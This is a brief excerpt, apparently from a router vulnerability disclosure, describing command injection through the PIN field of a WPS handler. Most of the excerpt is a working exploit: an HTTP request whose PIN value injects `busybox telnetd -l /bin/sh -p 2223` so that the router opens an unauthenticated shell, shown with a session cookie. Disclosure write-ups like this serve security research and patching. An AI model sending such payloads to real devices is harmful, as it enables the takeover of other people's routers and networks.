...
In `WPS` function, `PIN` is directly passed by the attacker, so we can control the `PIN` to attack the OS.
...
We set `PIN` as **`busybox telnetd -l /bin/sh -p 2223`** , and the router will excute it,such as:
...
Cookie: session_id=gR58XjHtqdeA1Tki2iEVKKL603wyY9rC
Upgrade-Insecure-Requests: 1

PINPBCRadio=1&PIN=`busybox telnetd -l /bin/sh -p 2223`
```
